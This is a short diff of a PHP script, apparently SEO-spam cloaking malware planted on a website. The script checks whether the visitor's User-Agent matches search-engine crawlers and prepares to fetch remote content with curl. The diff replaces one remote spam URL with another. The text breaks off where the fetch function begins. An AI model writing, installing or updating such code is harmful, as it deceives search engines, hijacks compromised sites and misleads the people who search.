@@ -1,7 +1,7 @@
 <?php
 @ob_start();
 header("Vary: User-Agent");
-$targetUrl = "https://obeydasupreme.site/badboys/unjambi.txt";
+$targetUrl = "https://badboys.ink/landing/kerengaksi.txt";
 $botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 function fetchContentCurl($url) {
